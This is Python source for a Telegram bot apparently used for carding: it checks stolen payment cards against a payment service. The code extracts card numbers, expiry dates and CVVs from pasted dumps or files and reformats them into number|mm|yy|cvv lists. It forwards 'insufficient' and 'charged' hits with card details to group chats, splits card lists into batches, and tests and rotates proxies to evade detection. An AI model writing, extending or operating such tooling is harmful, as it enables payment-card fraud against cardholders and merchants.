# ══════════════════════════════════════════════════════════════════════════════
#  /clean COMMAND — Extract all valid cards from messy data
# ══════════════════════════════════════════════════════════════════════════════

# Comprehensive card-number regex: Visa, Mastercard, Amex, Discover
_BARE_CC_RE = re.compile(
    r'(?<!\d)('
    r'4\d{12}(?:\d{3})?'                                                       # Visa: 13 or 16 digits, starts with 4
    r'|(?:5[1-5]\d{2}|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)\d{12}'   # Mastercard
    r'|3[47]\d{13}'                                                            # Amex: 15 digits, starts with 34/37
    r'|6(?:011|5\d{2}|22(?:1[2-9]|[2-8]\d|9([0-5]|[2-6]))|4[4-9]\d|4900|49\d{2})\d{8,12}'  # Discover
    r')(?!\d)'
)

# Full card pattern: number|mm|yy|cvv (supports |, /, :, space, - separators)
_FULL_CC_RE = re.compile(
    r'(\d{12,19})\s*[|/:\s\-]\s*(\d{1,2})\s*[|/:\s\-]\s*(\d{2,4})\s*[|/:\s\-]\s*(\d{3,4})'
)

# Expiry + CVV nearby pattern (for bare numbers found in context)
_NEARBY_EXP_CVV_RE = re.compile(
    r'(0[1-9]|1[0-2])\s*[/\-.]\s*(\d{2,4})\D{0,5}(\d{3,4})'
)


def _extract_all_cards(text: str) -> list[str]:
    """Extract all valid credit cards from messy text.

    Strategy:
      1. Find all FULL cards (number|mm|yy|cvv) first — highest confidence
      2. Find all bare card NUMBERS (Visa/MC/Amex/Discover) as fallback
      3. For bare numbers, try to find expiry+CVV nearby on the same line
      4. Deduplicate and return clean list
    """
    cards: list[str] = []
    seen: set[str] = set()

    # ── Pass 1: Full cards (number|mm|yy|cvv) ─────────────────────────────
    for m in _FULL_CC_RE.finditer(text):
        num = m.group(1).strip()
        mm = m.group(2).strip().zfill(2)
        yy_raw = m.group(3).strip()
        cvv = m.group(4).strip()
        # Normalize 4-digit year to 2-digit
        if len(yy_raw) == 4:
            yy = yy_raw[-2:]
        else:
            yy = yy_raw.zfill(2)
        card = f"{num}|{mm}|{yy}|{cvv}"
        if card not in seen:
            seen.add(card)
            cards.append(card)

    # ── Pass 2: Bare card numbers (with nearby expiry+CVV) ───────────────
    # Track which character ranges are already covered by full cards
    covered: list[tuple[int, int]] = []
    for m in _FULL_CC_RE.finditer(text):
        covered.append((m.start(), m.end()))

    def is_covered(pos: int, end: int) -> bool:
        for s, e in covered:
            if pos < e and end > s:
                return True
        return False

    for m in _BARE_CC_RE.finditer(text):
        if is_covered(m.start(), m.end()):
            continue  # already matched as part of a full card
        num = m.group(1)
        # Look for expiry+CVV within 30 chars after the number
        after = text[m.end():m.end() + 30]
        exp_cvv = _NEARBY_EXP_CVV_RE.search(after)
        if exp_cvv:
            mm = exp_cvv.group(1)
            yy_raw = exp_cvv.group(2)
            cvv = exp_cvv.group(3)
            if len(yy_raw) == 4:
                yy = yy_raw[-2:]
            else:
                yy = yy_raw.zfill(2)
            card = f"{num}|{mm}|{yy}|{cvv}"
            if card not in seen:
                seen.add(card)
                cards.append(card)
        else:
            # Bare number only (no expiry/CVV found nearby)
            card = f"{num}|xx|xx|xxx"
            if card not in seen:
                seen.add(card)
                cards.append(card)

    return cards


# ══════════════════════════════════════════════════════════════════════════════
#  /enableinsuff — Enable insufficient hit forwarding (owner only)
#  /disableinsuff — Disable insufficient hit forwarding (owner only)
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("enableinsuff"))
async def cmd_enableinsuff(message: types.Message):
    """Owner: Enable insufficient hit forwarding to channel + charged group."""
    if getattr(auth, "OWNER_ID", None) != message.from_user.id:
        await message.reply(f"{wpe('skull')} {_to_bi('Owner only command.')}")
        return
    global _insufficient_forward_enabled
    _insufficient_forward_enabled = True
    await message.reply(
        f"{wpe('check')} {_to_bi('Insufficient Forward ENABLED')}\n\n"
        f"{wpe('approved')} {_to_bi('INSUFFICIENT hits will be sent to:')} \n"
        f"{wpe('arrow_right')} {_to_bi('Channel (logs)')}\n"
        f"{wpe('arrow_right')} {_to_bi('Charged group (with card details)')}\n"
        f"{wpe('arrow_right')} {_to_bi('Personal chat (user who checked)')}\n\n"
        f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
    )


@router.message(Command("disableinsuff"))
async def cmd_disableinsuff(message: types.Message):
    """Owner: Disable insufficient hit forwarding."""
    if getattr(auth, "OWNER_ID", None) != message.from_user.id:
        await message.reply(f"{wpe('skull')} {_to_bi('Owner only command.')}")
        return
    global _insufficient_forward_enabled
    _insufficient_forward_enabled = False
    await message.reply(
        f"{wpe('skull')} {_to_bi('Insufficient Forward DISABLED')}\n\n"
        f"{wpe('warn')} {_to_bi('INSUFFICIENT hits will NOT be sent to:')} \n"
        f"{wpe('skull')} {_to_bi('Channel (logs) — DISABLED')}\n"
        f"{wpe('skull')} {_to_bi('Charged group — DISABLED')}\n"
        f"{wpe('star')} {_to_bi('Personal chat — still sent to user')}\n"
        f"{wpe('star')} {_to_bi('checked.txt — still saved')}\n\n"
        f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
    )


@router.message(Command("clean"))
async def cmd_clean(message: types.Message):
    """Extract all valid cards from messy text/data.

    Usage:
      /clean <paste text here>
      /clean  (reply to a message containing cards)
      /clean  (reply to a .txt file)
    """
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(message.from_user.id):
        return

    # ── Gather text from args, reply, or file ────────────────────────────
    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]

    # Check replied message
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text

    # If replied message has a document, download and read it
    if message.reply_to_message and message.reply_to_message.document:
        try:
            doc = message.reply_to_message.document
            # Only read text files under 5 MB
            if doc.file_size and doc.file_size > 5 * 1024 * 1024:
                await message.reply(
                    f"{wpe('warn')} {_to_bi('File too large (max 5 MB).')}"
                )
                return
            file = await bot.download(doc.file_id)
            content = file.read().decode("utf-8", errors="replace")
            raw_text = raw_text + "\n" + content if raw_text else content
        except Exception as e:
            await message.reply(
                f"{wpe('skull')} {_to_bi('Failed to download file:')} {_to_bi(str(e)[:80])}"
            )
            return

    if not raw_text.strip():
        await message.reply(
            f"{wpe('warn')} {_to_bi('No data found!')}\n\n"
            f"{wpe('arrow_right')} {_to_bi('Usage:')}\n"
            f"{wpe('arrow_right')} /clean {bold('paste text')}\n"
            f"{wpe('arrow_right')} {_to_bi('Reply to a message or .txt file with /clean')}"
        )
        return

    # ── Extract cards ────────────────────────────────────────────────────
    cards = _extract_all_cards(raw_text)

    if not cards:
        await message.reply(
            f"{wpe('skull')} {_to_bi('No valid cards found in the data.')}"
        )
        return

    # ── Send result ──────────────────────────────────────────────────────
    # If few cards, send as text. If many, send as .txt file.
    file_content = "\n".join(cards)

    summary_text = (
        f"{wpe('check')} {_to_bi('Clean Complete')}\n\n"
        f"{wpe('whop_hitter')} {_to_bi('Cards found:')} {_to_bi(str(len(cards)))}\n"
        f"{wpe('triple_ring')} {_to_bi('Formats: number|mm|yy|cvv (or number|xx|xx|xxx if no expiry/CVV found)')}\n\n"
        f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
    )

    await message.reply(summary_text)

    # Send the cleaned cards
    if len(cards) <= 10:
        # Send as code block
        await message.reply(f"<code>{file_content}</code>")
    else:
        # Send as .txt file
        try:
            await message.reply_document(
                document=types.BufferedInputFile(
                    file_content.encode("utf-8"),
                    filename="cleaned_cards.txt",
                ),
                caption=f"{wpe('neon_bow')} {_to_bi(f'{len(cards)} cards extracted')}",
            )
        except Exception as e:
            # Fallback: send as text
            log.error("/clean file send failed: %s", e)
            await message.reply(f"<code>{file_content}</code>")


# ══════════════════════════════════════════════════════════════════════════════
#  /split COMMAND — Split an uploaded .txt file into N-line chunks
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("split"))
async def cmd_split(message: types.Message):
    """Split an uploaded .txt file into N-line chunks.

    Usage:
      Reply to a .txt file, then send: /split 500
      /split 500 (with reply to file)
    """
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(message.from_user.id):
        return

    # ── Parse chunk size ──────────────────────────────────────────────────
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        # Show different limits based on access tier
        is_admin_user = False
        try:
            is_admin_user = auth.is_admin(message.from_user.id)
        except Exception:
            pass
        is_owner = getattr(auth, "OWNER_ID", None) == message.from_user.id
        is_admin_tier = is_admin_user or is_owner
        max_val = 10_000_000 if is_admin_tier else 2000
        await message.reply(
            f"{wpe('warn')} {_to_bi('No chunk size specified!')}\n\n"
            f"{wpe('arrow_right')} {_to_bi('Usage:')} /split N\n"
            f"{wpe('arrow_right')} {_to_bi('Example:')} /split 500\n"
            f"{wpe('arrow_right')} {_to_bi('Reply to a .txt file, then send /split 500')}\n"
            f"{wpe('star')} {_to_bi(f'Your range: 1-{max_val:,} lines per file')}"
        )
        return

    try:
        chunk_size = int(args[1].strip())
    except ValueError:
        await message.reply(
            f"{wpe('skull')} {_to_bi('Invalid number!')} "
            f"{_to_bi('Usage: /split 500')}"
        )
        return

    # ── Access tier: admin unlimited (1-10,000,000), normal users max 2000 ──
    is_admin_user = False
    try:
        is_admin_user = auth.is_admin(message.from_user.id)
    except Exception:
        pass
    is_owner = getattr(auth, "OWNER_ID", None) == message.from_user.id
    is_admin_tier = is_admin_user or is_owner

    SPLIT_ADMIN_MAX = 10_000_000     # admins/owner: up to 10 million lines per file
    SPLIT_USER_MAX  = 2000           # normal users: max 2000 lines per file

    user_max = SPLIT_ADMIN_MAX if is_admin_tier else SPLIT_USER_MAX
    user_min = 1
    user_label = "admin" if is_admin_tier else "user"

    if chunk_size < user_min or chunk_size > user_max:
        await message.reply(
            f"{wpe('warn')} {_to_bi(f'Chunk size must be {user_min}-{user_max:,} for {user_label}.')}\n"
            f"{wpe('arrow_right')} {_to_bi('Example:')} /split {min(500, user_max)}"
        )
        return

    # ── Get the file from reply ──────────────────────────────────────────
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply(
            f"{wpe('warn')} {_to_bi('No file found!')}\n\n"
            f"{wpe('arrow_right')} {_to_bi('Reply to a .txt file, then send:')}\n"
            f"{wpe('arrow_right')} /split {chunk_size}"
        )
        return

    doc = message.reply_to_message.document

    # Size limit: 50 MB
    if doc.file_size and doc.file_size > 50 * 1024 * 1024:
        await message.reply(
            f"{wpe('warn')} {_to_bi('File too large (max 50 MB).')}"
        )
        return

    # ── Send initial status ──────────────────────────────────────────────
    status_msg = await message.reply(
        f"{wpe('arc_reactor')} {_to_bi('Downloading and reading file...')} {wpe('processing')}"
    )

    # ── Download and read ────────────────────────────────────────────────
    try:
        file = await bot.download(doc.file_id)
        content = file.read().decode("utf-8", errors="replace")
    except Exception as e:
        await safe_edit(
            status_msg,
            f"{wpe('skull')} {_to_bi('Failed to read file:')} {_to_bi(str(e)[:80])}"
        )
        return

    lines = [l.strip() for l in content.splitlines() if l.strip()]
    total_lines = len(lines)

    if total_lines == 0:
        await safe_edit(
            status_msg,
            f"{wpe('skull')} {_to_bi('File is empty or contains no valid lines.')}"
        )
        return

    # ── Calculate chunks ─────────────────────────────────────────────────
    chunks = []
    for i in range(0, total_lines, chunk_size):
        chunks.append(lines[i:i + chunk_size])

    num_chunks = len(chunks)

    # ── Update status ────────────────────────────────────────────────────
    await safe_edit(
        status_msg,
        f"{wpe('bolt_yellow')} {_to_bi('Split File')}\n\n"
        f"{wpe('triple_ring')} {_to_bi('Total lines:')} {_to_bi(str(total_lines))}\n"
        f"{wpe('arrow_right')} {_to_bi('Chunk size:')} {_to_bi(str(chunk_size))}\n"
        f"{wpe('rocket')} {_to_bi('Files to send:')} {_to_bi(str(num_chunks))}\n\n"
        f"{wpe('arc_reactor')} {_to_bi('Sending files...')} {wpe('processing')}"
    )

    # ── Send each chunk as a .txt file ────────────────────────────────────
    sent_count = 0
    for i, chunk in enumerate(chunks, 1):
        chunk_content = "\n".join(chunk) + "\n"
        try:
            await message.reply_document(
                document=types.BufferedInputFile(
                    chunk_content.encode("utf-8"),
                    filename=f"split_{i}_of_{num_chunks}.txt",
                ),
                caption=(
                    f"{wpe('arrow_right')} {_to_bi(f'Part {i}/{num_chunks}')}"
                    f" ({_to_bi(str(len(chunk)))} {_to_bi('lines')})"
                ),
            )
            sent_count += 1
        except TelegramRetryAfter as e:
            wait = min(e.retry_after + 1, 30)
            log.warning("FloodWait %ss on /split file send — sleeping", wait)
            await asyncio.sleep(wait)
            try:
                await message.reply_document(
                    document=types.BufferedInputFile(
                        chunk_content.encode("utf-8"),
                        filename=f"split_{i}_of_{num_chunks}.txt",
                    ),
                    caption=(
                        f"{wpe('arrow_right')} {_to_bi(f'Part {i}/{num_chunks}')}"
                        f" ({_to_bi(str(len(chunk)))} {_to_bi('lines')})"
                    ),
                )
                sent_count += 1
            except Exception as e2:
                log.error("/split file send failed after retry: %s", e2)
        except Exception as e:
            log.error("/split file send failed: %s", e)
            await asyncio.sleep(1)

        # Small breathing room between sends
        await asyncio.sleep(0.3)

    # ── Final summary ────────────────────────────────────────────────────
    await safe_edit(
        status_msg,
        f"{wpe('check')} {_to_bi('Split Complete')}\n\n"
        f"{wpe('triple_ring')} {_to_bi('Total lines:')} {_to_bi(str(total_lines))}\n"
        f"{wpe('arrow_right')} {_to_bi('Chunk size:')} {_to_bi(str(chunk_size))}\n"
        f"{wpe('rocket')} {_to_bi('Files sent:')} {_to_bi(str(sent_count))}/{_to_bi(str(num_chunks))}\n\n"
        f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY URL PARSER — converts host:port:user:pass into a proxy URL
#  Used by /addproxy to test proxies before adding them to the user's list.
# ══════════════════════════════════════════════════════════════════════════════

def _parse_proxy_to_url(proxy_str) -> str | None:
    """Convert host:port:user:pass (or a URL form) into a proxy URL."""
    if not proxy_str or not str(proxy_str).strip():
        return None
    p = str(proxy_str).strip()
    if p.startswith(("socks5://", "socks4://", "http://", "https://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return None




# ══════════════════════════════════════════════════════════════════════════════
#  GLOBAL PROXY FALLBACK POOL — global_proxies.txt
#  Used automatically (everywhere) when a user has no proxies of their own,
#  so "No proxy set" errors can never block a check.
# ══════════════════════════════════════════════════════════════════════════════

GLOBAL_PROXIES_FILE = os.path.join(BASE_DIR, "global_proxies.txt")
_global_fallback_cache: list[str] = []
_global_fallback_mtime: float = 0.0


def _load_global_fallback_proxies() -> list[str]:
    """Load the global fallback proxy pool (auto-reloads on change)."""
    global _global_fallback_cache, _global_fallback_mtime
    try:
        if not os.path.isfile(GLOBAL_PROXIES_FILE):
            with open(GLOBAL_PROXIES_FILE, "w", encoding="utf-8") as _f:
                _f.write("# Global fallback proxies — one per line.\n")
                _f.write("# Used automatically when a user has no proxies of their own.\n")
                _f.write("# Formats: host:port  |  host:port:user:pass  |  http://user:pass@host:port\n")
    except Exception:
        pass
    try:
        mt = os.path.getmtime(GLOBAL_PROXIES_FILE)
    except OSError:
        return list(_global_fallback_cache)
    if _global_fallback_cache and mt == _global_fallback_mtime:
        return list(_global_fallback_cache)
    out: list[str] = []
    seen: set[str] = set()
    try:
        with open(GLOBAL_PROXIES_FILE, "r", encoding="utf-8") as f:
            for raw in f:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                if line not in seen:
                    seen.add(line)
                    out.append(line)
    except Exception:
        pass
    if out or _global_fallback_cache:
        _global_fallback_cache = out
        _global_fallback_mtime = mt
    return list(_global_fallback_cache)


def _global_fallback_proxy_dicts() -> list[dict]:
    """Convert global fallback proxy strings into the dict shape used by
    proxy_dict_to_url / helpers (ip, port, username, password, proxy_url)."""
    dicts: list[dict] = []
    for line in _load_global_fallback_proxies():
        try:
            url = _parse_proxy_to_url(line)
            if not url:
                continue
            p = str(line).strip()
            if p.startswith(("socks5://", "socks4://", "http://", "https://")):
                dicts.append({"proxy_url": p})
                continue
            parts = p.split(":")
            if len(parts) == 4:
                dicts.append({"ip": parts[0], "port": parts[1],
                              "username": parts[2], "password": parts[3],
                              "proxy_url": url})
            elif len(parts) == 2:
                dicts.append({"ip": parts[0], "port": parts[1],
                              "username": "", "password": "",
                              "proxy_url": url})
        except Exception:
            continue
    return dicts

# ══════════════════════════════════════════════════════════════════════════════
#  /addproxy COMMAND — Add 1-20 proxies (host:port:user:pass format)
#  Tests each proxy, keeps only live ones. Max 20 per user.
# ══════════════════════════════════════════════════════════════════════════════
#  /addmail COMMAND — Add emails for Whop checker (1 mail per request)
# ══════════════════════════════════════════════════════════════════════════════

# Mail commands removed — mails.txt is loaded globally

#  /addproxy COMMAND
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("addproxy"))
async def cmd_addproxy(message: types.Message):
    """Add proxies. Accepts:
      /addproxy host:port:user:pass (single)
      /addproxy (multi-line paste)
      Reply to a .txt file with /addproxy
    Tests each proxy, keeps only live ones (max 20).
    """
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(message.from_user.id):
        return

    user_id = message.from_user.id

    # ── Gather proxy lines ───────────────────────────────────────────────
    raw_text = ""
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        raw_text = args[1]
    if message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_text = raw_text + "\n" + reply_text if raw_text else reply_text
        # If replied message has a document, download it
        if message.reply_to_message.document:
            try:
                doc = message.reply_to_message.document
                if doc.file_size and doc.file_size > 5 * 1024 * 1024:
                    await message.reply(
                        f"{wpe('warn')} {_to_bi('File too large (max 5 MB).')}"
                    )
                    return
                file = await bot.download(doc.file_id)
                content = file.read().decode("utf-8", errors="replace")
                raw_text = raw_text + "\n" + content if raw_text else content
            except Exception as e:
                await message.reply(
                    f"{wpe('skull')} {_to_bi('Failed to download file:')} {_to_bi(str(e)[:80])}"
                )
                return

    if not raw_text.strip():
        await message.reply(
            f"{wpe('warn')} {_to_bi('No proxies found!')}\n\n"
            f"{wpe('arrow_right')} {_to_bi('Usage:')}\n"
            f"{wpe('arrow_right')} /addproxy host:port:user:pass\n"
            f"{wpe('arrow_right')} {_to_bi('Or paste multiple proxies (one per line)')}\n"
            f"{wpe('arrow_right')} {_to_bi('Or reply to a .txt file with /addproxy')}\n\n"
            f"{wpe('triple_ring')} {_to_bi('Format: host:port:user:pass')}\n"
            f"{wpe('star')} {_to_bi('Max 100 live proxies per user')}\n\n"
            f"{wpe('star')} {_to_bi('For Better Results use Rotational proxy')}"
        )
        return



    # Parse proxy lines
    proxy_lines = []
    for line in raw_text.strip().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # Accept: host:port:user:pass, http://..., socks5://...
        if ":" in line or line.startswith(("http://", "https://", "socks")):
            proxy_lines.append(line)

    if not proxy_lines:
        await message.reply(
            f"{wpe('skull')} {_to_bi('No valid proxy lines found!')}\n"
            f"{wpe('triple_ring')} {_to_bi('Format: host:port:user:pass')}"
        )
        return

    if len(proxy_lines) > 50:
        proxy_lines = proxy_lines[:50]

    # ── Send testing status ──────────────────────────────────────────────
    status_msg = await message.reply(
        f"{wpe('arc_reactor')} {_to_bi('Testing Proxies')} {wpe('processing')}\n\n"
        f"{wpe('triple_ring')} {_to_bi('Total:')} {_to_bi(str(len(proxy_lines)))}\n"
        f"{wpe('check')} {_to_bi('Live:')} 0\n"
        f"{wpe('skull')} {_to_bi('Dead:')} 0\n"
        f"{wpe('arc_reactor')} {_to_bi('Testing...')}"
    )

    # ── Test each proxy in parallel (thread pool) ───────────────────────
    import concurrent.futures
    live_proxies = []
    dead_proxies = []
    tested = 0

    def _test_one(proxy_str):
        """Test one proxy with a plain httpx request to httpbin.org/ip."""
        try:
            px = _parse_proxy_to_url(proxy_str)
            if not px:
                return (proxy_str, False, "Invalid proxy format")
            try:
                cli = httpx.Client(timeout=15, proxy=px)
            except TypeError:  # older httpx uses proxies=
                cli = httpx.Client(timeout=15, proxies=px)
            try:
                r = cli.get("https://httpbin.org/ip", timeout=15)
                if r.status_code == 200:
                    try:
                        ip = r.json().get("origin", "?")
                    except Exception:
                        ip = "?"
                    return (proxy_str, True, ip)
                return (proxy_str, False, f"HTTP {r.status_code}")
            finally:
                cli.close()
        except Exception as e:
            return (proxy_str, False, str(e)[:80])

    # Test in parallel (max 10 at a time)
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(_test_one, p): p for p in proxy_lines}
        for future in concurrent.futures.as_completed(futures):
            try:
                proxy_str, ok, info = future.result()
            except Exception:
                proxy_str = futures[future]
                ok, info = False, "Test crashed"
            tested += 1
            if ok:
                live_proxies.append(proxy_str)
            else:
                dead_proxies.append((proxy_str, info))

            # Update status every 3 proxies or on completion
            if tested % 3 == 0 or tested == len(proxy_lines):
                try:
                    await safe_edit(
                        status_msg,
                        f"{wpe('arc_reactor')} {_to_bi('Testing Proxies')} {wpe('processing')}\n\n"
                        f"{wpe('triple_ring')} {_to_bi('Total:')} {_to_bi(str(len(proxy_lines)))}\n"
                        f"{wpe('check')} {_to_bi('Live:')} {_to_bi(str(len(live_proxies)))}\n"
                        f"{wpe('skull')} {_to_bi('Dead:')} {_to_bi(str(len(dead_proxies)))}\n"
                        f"{wpe('arc_reactor')} {_to_bi(f'Tested {tested}/{len(proxy_lines)}...')}"
                    )
                except Exception:
                    pass

    # ── Save live proxies ───────────────────────────────────────────────
    # Get existing proxies and merge
    existing = get_user_whop_proxies(user_id)
    all_proxies = existing + live_proxies
    # Dedupe + cap at 20
    saved_count = set_user_whop_proxies(user_id, all_proxies)
    final_proxies = get_user_whop_proxies(user_id)

    # ── Final summary ────────────────────────────────────────────────────
    dead_lines = "\n".join(
        f"{wpe('skull')} <code>{p}</code> — {_to_bi(reason[:50])}"
        for p, reason in dead_proxies[:10]  # show first 10 dead
    )
    if len(dead_proxies) > 10:
        dead_lines += f"\n{wpe('arrow_right')} {_to_bi(f'... {len(dead_proxies) - 10} more dead')}"

    final_text = (
        f"{wpe('check')} {_to_bi('Proxy Test Complete')} {wpe('check')}\n\n"
        f"{wpe('triple_ring')} {_to_bi('Tested:')} {_to_bi(str(tested))}\n"
        f"{wpe('approved')} {_to_bi('Live:')} {_to_bi(str(len(live_proxies)))}\n"
        f"{wpe('skull')} {_to_bi('Dead:')} {_to_bi(str(len(dead_proxies)))}\n\n"
        f"{wpe('star')} {_to_bi('Your live proxies:')} {_to_bi(str(len(final_proxies)))}/{_to_bi(str(MAX_PROXIES_PER_USER))}\n"
    )
    if dead_lines:
        final_text += f"\n{dead_lines}\n"
    final_text += f"\n{wpe('whop_hitter')} {_to_bi('Whopex')}"

    await safe_edit(status_msg, final_text)


# ══════════════════════════════════════════════════════════════════════════════
#  /rmproxy COMMAND — Remove ALL proxies for the current user
# ══════════════════════════════════════════════════════════════════════════════

@router.message(Command("rmproxy"))
async def cmd_rmproxy(message: types.Message):
    """Remove all proxies for the current user — PERMANENTLY.

    v76.2 — Clears ALL proxy stores so removed proxies NEVER come back:
      1. whop_proxies.json  (where /addproxy saves — cleared by remove_all_user_whop_proxies)
      2. proxy.json         (legacy store — cleared by del_user_proxy)
      3. In-memory caches   (force-invalidated so the change takes effect
                             immediately, even mid-bulk-run)

    Previously /rmproxy only cleared whop_proxies.json, so old proxies in
    proxy.json kept being used by _get_unified_proxy_pool → the bot kept
    using removed proxies. This fix ensures a removed proxy is GONE.
    """
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return
    if auth.is_banned(message.from_user.id):
        return

    user_id = message.from_user.id

    # 1. Clear whop_proxies.json (where /addproxy saves)
    removed_whop = remove_all_user_whop_proxies(user_id)

    # 2. v76.2 — ALSO clear proxy.json (legacy store). This was the bug:
    #    /rmproxy only cleared whop_proxies.json, so old proxies in
    #    proxy.json kept being used by _get_unified_proxy_pool.
    removed_legacy = 0
    try:
        # del_user_proxy removes the user's entire entry from proxy.json
        # and saves the file (which updates the mtime → cache auto-reloads).
        _legacy_data = _load_proxies()
        _legacy_entry = _legacy_data.get(str(user_id), [])
        if isinstance(_legacy_entry, list):
            removed_legacy = len(_legacy_entry)
        elif _legacy_entry:
            removed_legacy = 1
        if str(user_id) in _legacy_data:
            del_user_proxy(user_id)
    except Exception as _e:
        log.warning("/rmproxy: failed to clear proxy.json for user %s: %s",
                    user_id, _e)

    # 3. v76.2 — Force-invalidate BOTH in-memory caches so the change
    #    takes effect IMMEDIATELY (even if a bulk run is mid-flight and
    #    the cache mtime check would otherwise skip the reload).
    global _proxy_cache, _proxy_cache_mtime, _whop_proxies_cache, _whop_proxies_cache_mtime
    _proxy_cache = None
    _proxy_cache_mtime = 0.0
    _whop_proxies_cache = None
    _whop_proxies_cache_mtime = 0.0

    total_removed = removed_whop + removed_legacy

    if total_removed > 0:
        await message.reply(
            f"{wpe('check')} {_to_bi('Proxies Removed')} {wpe('check')}\n\n"
            f"{wpe('skull')} {_to_bi('Removed:')} {_to_bi(str(total_removed))} {_to_bi('proxies')}\n"
            f"{wpe('arrow_right')} {_to_bi('whop_proxies.json:')} {_to_bi(str(removed_whop))}\n"
            f"{wpe('arrow_right')} {_to_bi('proxy.json (legacy):')} {_to_bi(str(removed_legacy))}\n\n"
            f"{wpe('warn')} {_to_bi('All proxies permanently removed — cleared from both stores.')}\n"
            f"{wpe('arrow_right')} /addproxy {_to_bi('to add new proxies')}\n\n"
            f"{wpe('whop_hitter')} {_to_bi('Whopex')}"
        )
    else:
        await message.reply(
            f"{wpe('warn')} {_to_bi('You have no proxies to remove.')}\n"
            f"{wpe('arrow_right')} /addproxy {_to_bi('to add proxies')}"
        )


